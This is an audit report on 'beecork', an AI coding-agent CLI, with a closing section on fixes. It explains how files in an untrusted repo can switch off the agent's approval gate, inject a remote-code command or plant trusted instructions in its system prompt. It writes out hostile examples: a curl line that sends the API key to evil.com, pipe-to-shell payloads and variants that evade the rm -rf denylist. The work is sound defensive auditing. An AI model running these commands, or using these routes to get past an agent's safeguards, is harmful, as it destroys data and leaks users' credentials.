# beecork Audit — Final Report

## 1. Verdict

beecork is a small, well-built, defensively-coded CLI that has clearly graduated from "learning project" to "production-shaped." The core safety machinery is sound: the path-confinement guard fails *closed* in headless mode, the agentic loop has abort handling, retries, loop detection, snapshot rollback, and mid-turn compaction, and the code is unusually well-commented throughout. There is **one genuine High** — a project-local `.env` can silently disable approvals and inject a post-edit shell command — plus a cluster of **Mediums** that all share a single root cause: the tool trusts files in the current working directory (a possibly-cloned, untrusted repo) as if they were the user's own configuration. Everything below that is ordinary code-health: duplication, comment drift, `any`-typing at the edges, and scattered magic numbers. Nothing is catastrophic; the High and the workspace-trust Mediums are the only items worth fixing before broader use.

---

## 2. Critical & High

### Project-local `.env` disables the approval gate and injects an unguarded post-edit command (`src/config.ts:6`, `:31`, `:33` → `tools.ts:401` via `agent.ts:189`)
**What:** `config.ts:6` calls `process.loadEnvFile(".env")` against the CWD *before* reading every security knob. Node's `loadEnvFile` does not override shell-exported vars but **does inject vars that are absent** (the common case). A committed `.env` in an untrusted repo can therefore set `AUTO_APPROVE=1` (skips the per-tool gate at `agent.ts:166`) and `VERIFY_COMMAND="curl evil|bash"`, which `runVerify` execs verbatim after *every* `write_file`/`edit_file` (`tools.ts:401`) with no denylist and no prompt.
**Why it bites:** The primary use case of a coding agent is "clone a repo, cd in, run it." That single flow hands an attacker config-injection → safety-bypass → RCE as the user. `.gitignore` excluding `.env` does *not* help — the threat is a *different* repo's committed `.env`.
**Fix:** Read `AUTO_APPROVE`/`VERIFY_COMMAND` (and arguably `MAX_STEPS`/`MAX_CONTEXT_TOKENS`/`KEEP_RECENT`) from the real process env **before** `loadEnvFile`, or snapshot `process.env` keys present before the load and ignore newly-introduced sensitive keys. Better: parse `.env` with `util.parseEnv` and apply only an allowlist (`OPENROUTER_API_KEY`, `OPENROUTER_MODEL`, `BRAVE_API_KEY`), or load `.env` only from a trusted home/config dir. At minimum, print a loud warning when a project `.env` supplies these flags.
*(Correction to original claim: `AUTO_APPROVE` does not bypass the per-call path guard at `agent.ts:146` — that still hard-*denies* out-of-root paths. It only skips the per-tool gate at `:166`. The kill chain via `VERIFY_COMMAND` stands regardless.)*

---

## 3. Medium

### `.beecork/settings.json` `alwaysAllow` and `cork.md` are trusted by default — no workspace-trust boundary (`src/index.ts:34`, `:29`; `memory.ts:24-31`, `53-63`)
A committed `.beecork/settings.json` with `{"alwaysAllow":["run_bash","write_file","edit_file"]}` is silently merged into `approvedTools` at startup, so the per-tool gate (`agent.ts:166`) never fires and the user is never told; a committed `cork.md` is concatenated into the system prompt under "...follow these," i.e. direct trusted instruction injection. Loaded from every ancestor dir + cwd; only `.beecork/sessions/` is gitignored, so these travel with a repo. The still-active path guard and denylist bound it, but silently pre-approving `run_bash` in an untrusted repo is effectively un-prompted arbitrary shell (e.g. `curl -d @~/.beecork/config.json evil.com` leaks the OpenRouter key). **Fix:** honor `alwaysAllow` only from `~/.beecork`; show pre-approved tools + source in the banner and require a one-time "trust this workspace?" confirm for project-sourced ones; wrap project `cork.md` as lower-trust text rather than authoritative.

### `DANGEROUS_BASH` denylist is trivially bypassable (`src/tools.ts:28-35`, enforced `:231`)
`/\brm\s+-rf?\s+(--no-preserve-root\s+)?[/~]/` matches only `-r`/`-rf` and requires `/`/`~` to directly follow whitespace, so `rm -fr /`, `rm -rfv /`, `rm -rf -- /`, `rm -rf $HOME`, `rm -r --force /` all slip through. The fork-bomb rule matches only the literal `:(){...}`; pipe-to-shell is evaded by `bash <(curl evil)`, `eval "$(curl evil)"`, `curl evil | python`, or download-then-run. Matched against the raw string with no normalization. In interactive mode the human is the real gate; but under `AUTO_APPROVE` or after "always allow run_bash" this denylist is the *only* protection — and it doesn't hold. **Fix:** treat the denylist as advisory only; in headless/always-allowed mode, hard-deny or out-of-band-confirm commands containing `rm`/`dd`/`mkfs`/pipe-to-interpreter patterns rather than trusting a regex. If kept, normalize flag clusters and resolve leading `--`. A per-call guard on `run_bash` (mirroring the path guard) is the right shape.

### `edit_file` corrupts replacements containing `$` (`src/tools.ts:190`)
`original.replace(args.old_text, args.new_text)` — `String.prototype.replace` interprets `$$`, `$&`, `` $` ``, `$'` in the *replacement* even with a string search. So `new_text` with `$$` (shell PID) collapses to `$`, `$&` expands to the matched text, etc. The tool returns "replaced 1 occurrence" and the approval preview (`agent.ts:70`) renders the *intended* text, so the corruption is invisible at the gate too — textbook "silently does the wrong thing." (Scope correction: `$1..$n` and `${x}` are *not* affected with a string search; only `$$`/`$&`/`` $` ``/`$'`.) **Fix:** use a function replacer — `original.replace(args.old_text, () => String(args.new_text))` — or splice by `indexOf`.

### `AUTO_APPROVE=false` / `=0` silently *enables* headless mode (`src/config.ts:33`)
`Boolean(process.env.AUTO_APPROVE)` is true for any non-empty string, so a user exporting `AUTO_APPROVE=false` to "be safe" gets every interactive prompt removed — the gate fails *open*. The eval harness already knows this trap and works around it by deleting the var (`harness.ts:99-106`), yet the production path still uses raw `Boolean()`. Default-safe (unset → off) and only the per-tool prompt is affected (path guard still fails closed), which keeps it Medium. **Fix:** `["1","true","yes","on"].includes(String(process.env.AUTO_APPROVE ?? "").trim().toLowerCase())`.

---

## 4. Low / Nits

**Low — behavioral/robustness**
- **web_fetch has no SSRF guard** (`tools.ts:256-263`) — validates scheme only, `redirect:"follow"`; can reach `127.0.0.1`/`169.254.169.254`/RFC1918/decimal-IP, and an allowed URL can 302-pivot into them. Low for a local laptop (raise to Medium if ever run on a cloud VM). Fix: DNS-resolve and reject loopback/link-local/private/unspecified; `redirect:"manual"` + re-check each hop.
- **web_fetch reads the whole body before any size cap** (`tools.ts:266-271`) — `await res.text()` then truncate; `htmlToText` runs over the full body. Bounded by V8's ~512MB string limit (throws, caught), not "gigabytes," but still a several-hundred-MB spike. Fix: stream `res.body` to a byte ceiling before decoding.
- **search compiles model-supplied regex with no timeout** (`tools.ts:87`,`117`) — `(a+)+$` against a long line hangs the single thread; sync regex can't be interrupted by the AbortController. Fix: skip/truncate lines over ~10k chars, or use RE2.
- **Empty/exhausted completion → silent no-op turn + `content:null` persisted** (`api.ts:126`; `agent.ts:111`,`206-207`) — after retries the turn ends printing nothing (no error), and a `content:null`/no-tool assistant message stays in history and rides into the next request (some providers 400). Fix: detect no-content/no-tool turns, print a visible notice, and don't append the null message (or `throw` so the snapshot rolls it back). *(Line 133's fallback return is unreachable; see nits.)*
- **No resilient/cancelable OpenRouter seam; `summarize()` is second-class** (`api.ts:31-36`, `context.ts:32-46`, `harness.ts:257-267`) — the chat-completions call is hand-built in three places (the judge even hardcodes the URL instead of `config.apiUrl`); `summarize()` uses a bare `fetch` with **no retry, no abort signal, no timeout**, so Ctrl-C can't cancel a hung compaction and a transient blip throws → `agent.ts:104-108` logs "continuing" and proceeds over-budget. Fix: extract `chatCompletion(messages,{stream,signal})` owning URL/auth/retry; route `summarize` and judge through it; thread the turn signal into `compactIfNeeded`→`summarize`; add a hard-trim fallback for permanent compaction failure.
- **`summarize()` assumes `choices[0].message` exists** (`context.ts:49`) — a 200 with `{error}` or `{choices:[]}` throws a cryptic TypeError that surfaces as a generic "compaction failed." Use `data?.choices?.[0]?.message?.content` and echo `data.error` (matches the defensive style already in `api.ts:80`).
- **`runTurn` rolls back the *entire* turn including the user's message** (`agent.ts:95-96`,`227-234`) — snapshot is taken before the user message is pushed, so a transient error at step 30 erases the prompt with only `[error] <msg>`. Fix: take the snapshot *after* pushing the user message (still a valid trailing state).
- **Top-level error handling missing** (`index.ts:95-98`,`110`,`114`; `run.ts:109`) — `await handleCommand(...)` is unwrapped (e.g. `/key`→`saveUserConfig` write error throws), and `main()` has no `.catch`, so a startup/command I/O error becomes a raw unhandled rejection that kills the REPL and skips `saveSession`. Fix: try/catch the command dispatch; `main().catch(e => { console.error(e); process.exit(1); })`.
- **Malformed `settings.json`/`config.json` silently swallowed** (`memory.ts:55-61`,`72-76`) — a JSON typo is treated identically to a missing file: drops `model`/`alwaysAllow`, or nukes the saved API key, with zero warning. Fix: branch on `err.code === "ENOENT"` (skip) vs SyntaxError (warn, naming the file).
- **Loop detector only catches byte-identical repeats** (`agent.ts:117-120`) — a re-read with drifting `offset` or re-search with trivial pattern changes evades it and burns to the 50-step cap. Bounded and graceful. Fix: add a coarse name+target signal; at minimum document the limit.
- **`markLines` rasterizes the logo from SVG geometry at runtime** (`ui.ts:47-71`) — always called with `markLines(24)`; the `width` param is dead flexibility while the adjacent wordmark is a plain string array. Cosmetic taste call (the SVG isn't in the repo, so this is the de-facto source of the art). At most: drop the unused `width` param.
- **`lineDiff` builds full O(m·n) LCS for a 40-line-capped preview** (`diff.ts:12`; `agent.ts:74`) — overwriting a 5k-line file allocates a ~25M-cell matrix the user never sees past line 40; interactive-only. Fix: short-circuit to a "replace N→M lines" summary (or slice inputs to ~200 lines) above a threshold. Also cap the unbounded `existing` read at `agent.ts:72`.
- **`num()` env helper silently ignores a configured `0`** (`config.ts:13`) — `Number(env) || fallback` rewrites `KEEP_RECENT=0`/`MAX_STEPS=0` to defaults. Fix: `const n = Number(env); return Number.isFinite(n) ? n : fallback`.
- **Streamed text re-printed on retry** (`api.ts:88`,`107-111`,`120-121`) — a stream that prints prose *and* has a partial tool call, then dies, re-streams and re-prints the prose; the retry separator is also mislabeled `(empty response — retry)`. Cosmetic. Fix: buffer text until clean stream, or print a "superseded — retrying" marker.
- **`.beecork` dir name + home/cwd paths duplicated ~7×** (`memory.ts:25,30,68,96,107`; `tools.ts:359`) — the sessions path is byte-identical in `saveSession`/`loadLatestSession`. Fix: `const BEECORK_DIR` + `homeBeecork()`/`projectBeecork()`/`sessionsDir()` helpers.
- **Operational magic numbers scattered despite config.ts owning "all knobs"** (`tools.ts:93,236,262,301,401,403,406`; `agent.ts:44,47`) — exec timeouts 30s/60s, `maxBuffer:1_000_000` (duplicated), fetch/search 20s/15s, search MAX 100, verify slices -800/-1500, diff cap 40 (twice). Fix: promote to config with env overrides; comment the 800-vs-1500 asymmetry.
- **Inconsistent numeric coercion** (`tools.ts:57-58` vs `:297`) — `web_search` does `Number(args.count)`, `read_file` uses `offset`/`limit` raw; a string `"5"` makes `start + args.limit` concatenate, so the continuation hint prints e.g. `951` instead of `96`, sending the agent to a wrong offset. Fix: coerce read_file numerics; add a shared `intArg(v,def,min,max)`.
- **Tool args are untyped** (`types.ts:19,21`) — `parameters: object` + `run: (args: Record<string,any>)`; a schema/handler rename compiles cleanly and fails at runtime. Fix: const-assert schemas and infer the arg type (or zod/typebox single source); at minimum type `parameters` as JSONSchema.
- **`config.ts` header claims "every knob env-overridable" — false** (`config.ts:1-2`,`16-17`,`27-28`) — `loopRepeatLimit`, `retryAttempts`, `apiUrl`, `modelsUrl` have no override. Fix: wrap in `num(...)`/`process.env ?? ...`, or soften the comment.
- **`export let todos` unused outside `tools.ts` + stale "rendered at startup" comment** (`tools.ts:17-18`) — nothing renders it at startup. Fix: drop `export`, fix the comment.
- **Harness `/Missing OPENROUTER_API_KEY/` regex is dead** (`harness.ts:169`) — the agent prints "No OpenRouter API key." (`index.ts:54`); only `code !== 0` actually classifies the case. Fix: delete the clause or match the real string.
- **No `package.json` "engines"** despite `process.loadEnvFile`/`AbortSignal.timeout`/global `fetch` (Node ≥20.12). Add `"engines": { "node": ">=20.12" }`. *(Note: both `loadEnvFile` calls are in try/catch, so old Node fails silently/later, not with the cited startup error — add an explicit version check if a clear message is wanted.)*

**Nits — style / comments / dead code / duplication**
- **Path tools don't re-check `inRoot`** (`tools.ts:55,148,181,212`) — confinement relies solely on the per-call guard; a future caller skipping it would escape. Cheap backstop: `if (!inRoot) return "Error: outside project root"` in each `run()`. (Also subsumes the abs-vs-real "TOCTOU" and the `pathGuard`-only-checks-`args.path` concerns — the `real`/`abs` swap does *not* close any TOCTOU window; the in-tool `inRoot` check is the right fix.)
- **API key echoed in cleartext** at the paste prompt (`index.ts:44`) and `/key <arg>` (`commands.ts:24-31`) — storage is fine (chmod 600, excluded from sessions/trace). Mask the input; prompt for `/key` on a separate muted line.
- **Saved transcripts persist raw tool output** (`commands.ts:56`; `memory.ts:98`) — `/good`/`/bad`/sessions capture run_bash output that *the user* printed. Dirs are gitignored; the OpenRouter key never enters transcripts. Do **not** scrub (corrupts eval replay). One real action: decide whether `.beecork/memory.md`/`settings.json` should be gitignored.
- **Tool-call reassembly: sparse `tc.index` creates array holes** (`api.ts:94`,`127`; consumed `agent.ts:114`) — `for..of` yields `undefined` for holes → TypeError → rollback. Requires a non-conformant provider. Cheap guard: `.filter(Boolean)` at the consumption site. (The "parallel calls without index" mode is already non-crashing.)
- **`read_file` offset past EOF reports `(empty file)`** (`tools.ts:57-64`) — misleads the model into thinking a non-empty file is empty. Distinguish `start >= allLines.length` with a "past end of file; N lines" hint.
- **`compactionStart` reads `messages[start]` OOB when `keepRecent === 0`** (`context.ts:57-61`) — unreachable in prod (the `num()` `||` trap), but the function is documented as unit-testable. Clamp: `Math.min(messages.length-1, ...)`.
- **OpenRouter request built twice** (`api.ts:31-36`, `context.ts:32-46`) — covered by the chat-completions-seam item above.
- **Deny/blocked tool-result scaffolding repeated 3×, push-pattern 5×** in `runTurn` (`agent.ts:122-128,146-178,204`) — all pair `tool_call_id` correctly today. Optional `pushToolResult(content)` helper.
- **`resolveInRoot` computed twice per file tool** (guard + run; 3× on the write_file approval path) with inconsistent `?? "."` vs `?? ""` defaults (`tools.ts:22` vs `55/148/181`). Harmless; standardize the default to `?? "."`.
- **web_fetch truncates to `maxToolResultChars`, then `runTurn` truncates again** (`tools.ts:269-271` vs `agent.ts:194-198`) — the central cap is authoritative (and accounts for the banner). Drop the in-tool cap. (Note: `htmlToText` already materializes the full body, so it saves nothing.)
- **Per-tool `catch → return \`Error …: ${(err as Error).message}\`` repeated 8×** (`tools.ts:66,152,193,217,239,274,312,371`) — a deliberate convention. If reducing: a `fail(verb, err)` helper that keeps the per-tool verbs; do **not** collapse into one generic `runTool` wrapper.
- **Tool-call JSON args parsed 3× per call** (`agent.ts:135`,`59`; `tools.ts:389`) — parse once at the top of the loop and thread the result through.
- **`RunResult.exitCode` set, never read** (`harness.ts:77`,`172`) — `errored` already encodes it. Drop it (or comment as intentionally kept).
- **`Task.difficulty` populated on all 29 tasks, never consumed** (`harness.ts:64`) — unlike sibling `group`. Prefer surfacing a difficulty breakdown in the report over deletion.
- **`state.apiKey`/`braveKey` initializers are dead** (`state.ts:4,9,10`) — unconditionally overwritten at `index.ts:21`,`58` before any read. Init to `""`, drop the `API_KEY` import in `state.ts`.
- **Unreachable fallback `return {content:null}`** (`api.ts:131-133`) — the loop always returns/throws on the last attempt; the empty case is actually serviced at `:126`. Keep for TS, fix the misleading comment.
- **Comment drift:** harness says "the existing 14 tasks return bare booleans" but 5 return `{correct,style}` (`harness.ts:47-49` vs `tasks.ts:51,69,115,128,153`); `memory.ts:1-3` header says `cork.md` lives in `.beecork/` but it's read from each folder's *root* (`:25`); `tools.ts:17` "rendered at startup" is false; `api.ts:131-133` "caller/eval" treats no-op as error — only the eval does; `/help` shows `/key <slug>` but it takes a key not a model slug (`commands.ts:75` vs `:26`); missing comment on the security-relevant `abs`-vs-`real` choice (`paths.ts:11-18`).
- **`write_file` writes `args.content` raw but measures `String(args.content).length`** (`tools.ts:149-150`) — coerce once.
- **Untyped JSON responses** (`api.ts:73`, `commands.ts:101`, `tools.ts:305`) — add small interfaces (`ChatCompletionChunk`, `OpenRouterModel`, `BraveResult`), keep the `?.` defense.
- **Color/ANSI helper duplicated** (`ui.ts:9` vs `run.ts:30`) — note eval is intentionally standalone, or share just the `paint` factory (don't import `color` wholesale — eval omits `FORCE_COLOR` on purpose).
- **`catch (err: any)` in `runVerify`** (`tools.ts:404`) — the only `any` catch (reaches `err.stdout`/`stderr`). Type a narrow `ExecError` interface (built-in `ExecException` lacks `stdout`/`stderr`).

---

## 5. Notable NON-issues (don't "fix" these)

- **The path guard's `real`-vs-`abs` split is correct, not a TOCTOU bug.** The verdict *must* be computed on the symlink-canonicalized `real` (checking textual `abs` would let an in-root-looking symlink escape); the fs op then uses `abs` because the OS re-resolves the same symlinks to the same inode. Swapping to operate on `real` would be a security no-op — both are strings re-followed at op time. The only true TOCTOU close is `O_NOFOLLOW`/post-open `fstat`, which buys ~nothing on a single-user tool where any concurrent FS mutation already requires a `run_bash` that could write out-of-root directly. Leave it.
- **The OpenRouter API key never enters transcripts.** It's sent only as an `Authorization` header (`api.ts:33`) and stored chmod-600 in `~/.beecork/config.json` (`memory.ts:87`); it's excluded from saved sessions/trace. The only secrets in `/good`/`/bad`/sessions are ones the user themselves printed via `run_bash`, into gitignored dirs — intended behavior. **Do not scrub transcripts**; it corrupts faithful eval replay and gives false assurance.
- **The empty-completion *retry itself* is the right call**, not a band-aid. A reasoning-model stream that 200-OKs then truncates can't be fixed client-side. The only fix needed is at the *end* of the road (the silent no-op + null message — see Low).
- **The eval's short `TMP_BASE`** (`harness.ts:33`) is legitimate measurement-noise reduction, and the harness already flags any no-op turn as ERROR (`harness.ts:165`) — it does *not* hide failures or produce false PASSes. Don't add a flaky deep-cwd integration task (the empty-stream trigger is model/provider-specific); cover the degradation path with a unit test that stubs `callModel` to return `content:null`.
- **eval/README's "tool" group description is already in sync** with the suite — it already lists `web_fetch` and `web_search` (README:89-90). The original finding quoted a stale version of the line. No change.
- **The agent running shell commands / editing files is by design** and not a vulnerability per the threat model.

---

## 6. Themes

1. **Trusting the CWD / project as if it were the user's own environment.** The High (`.env`) and two Mediums (`.beecork/settings.json` `alwaysAllow` + `cork.md`; the denylist as sole headless gate) all stem from treating a cloned/untrusted repo's files as trusted configuration. A single "workspace trust" boundary — only honor security-relevant config (`AUTO_APPROVE`, `VERIFY_COMMAND`, `alwaysAllow`) from `~/.beecork` or the real shell env, and treat project `cork.md` as lower-trust — would neutralize the highest-value cluster at once.

2. **`summarize()` is a second-class copy of `callModel()`.** The chat-completions call is hand-built in three places with no shared seam; the `summarize` copy lacks retry, abort-signal, timeout, and defensive response parsing, so it's simultaneously a duplication, a cancelability gap, a resilience gap, and a crash-on-malformed-body risk. One `chatCompletion()` chokepoint root-causes four findings.

3. **Error-swallowing catches that mask the real cause.** Malformed config silently dropped (`memory.ts`), compaction failure "continuing" into a likely 400, empty response → silent no-op, startup throws → raw unhandled rejection. The pattern is "treat broken identically to absent / log a generic message and proceed." Distinguishing the two and surfacing one visible, specific message each is cheap and high-value.

4. **`any`-typing at the boundaries + magic numbers outside config.** Tool args (`Record<string,any>`), wire-format JSON (`data: any`), and the schema/handler link are all untyped, while operational constants (exec timeouts, buffers, caps) live inline despite `config.ts` advertising itself as the single source of tunables. Both are drift-prone: a renamed schema key or a slow test suite hitting a hardcoded 30s wall fails silently with no compile-time or config-level signal.
---

## Resolution (fixed in this session)

**Verification:** typecheck clean · 16/16 unit tests · full eval 32/33 (only the known hard `honor a rule…compaction` fails; 0 flaky, 0 errors) · targeted exploit/behavior tests for each security item.

**High (1/1 fixed)**
- `.env` config-injection RCE → parse `.env` and apply only a 3-key allowlist (`OPENROUTER_API_KEY`/`MODEL`/`BRAVE_API_KEY`); security flags come only from the real shell env. (`config.ts`)

**Medium (4/4 fixed)**
- Workspace trust: `alwaysAllow` honored only from `~/.beecork` (project files warned + ignored); project `cork.md`/`memory.md` framed as lower-trust and can't authorize bypassing safety. (`memory.ts`, `index.ts`)
- `edit_file` `$`-corruption → function replacer. (`tools.ts`)
- `AUTO_APPROVE=false` fails open → explicit-truthy `bool()`. (`config.ts`)
- `run_bash` denylist bypass → per-call `bashGuard` (risky cmds asked every time, never "always"-cached, hard-blocked headless) + tightened catastrophe backstop. (`tools.ts`, `agent.ts`)

**Low / Nit (most fixed)**
- `web_fetch`: SSRF guard (DNS-resolve, block private/loopback/link-local incl. 169.254.169.254) + manual redirect re-check + streaming byte cap. `search`: skip >10k-char lines (ReDoS).
- Resilience: shared `openRouterChat` seam; `summarize()` retry+abort+timeout+defensive-parse; `compactIfNeeded` hard-trim fallback; empty/no-op turn surfaces a notice and doesn't persist a null message; tool-call array-hole filter.
- Robustness: top-level `main().catch` + command try/catch (index + run); malformed `settings.json`/`config.json` now warn; `runTurn` rollback keeps the user's message; `num()` honors `0`; `compactionStart` OOB clamp; `read_file` numeric coercion + past-EOF hint; `lineDiff` O(m·n) guard + capped preview read.
- Cleanliness: magic numbers → `config` (timeouts/buffers/caps); `fail()` helper; `ExecError` type; dropped dead `todos` export + `state` initializers; `.beecork` path dedup; corrected comment drift; `package.json` engines `>=20.12`; loopRepeatLimit/retryAttempts now env-overridable.

**Deferred (with rationale)**
- In-tool `inRoot` re-check — would BREAK *approved* out-of-root access (allowed by design via the gate); the per-call guard is the correct mechanism.
- API-key input masking — needs fragile raw-mode TTY handling; storage already secure (chmod 600, excluded from transcripts). UX/packaging item.
- Typed tool args (zod) — large refactor; kept `Record<string,any>` + `?.` defenses.
- Full `run_bash` path confinement — deferred by the roadmap (Codex-style OS sandbox); the guard's deterrent message is the current mitigation.
- `markLines` width param (used by a test), color dup (eval intentionally standalone), transcript scrubbing (audit says DON'T — corrupts eval replay).

**Note:** during the pass I introduced and then caught a regression — generalizing the guard message dropped the "don't route around via run_bash/cat" deterrent, which made the two confinement eval tasks fail; restoring it returned them to 3/3.
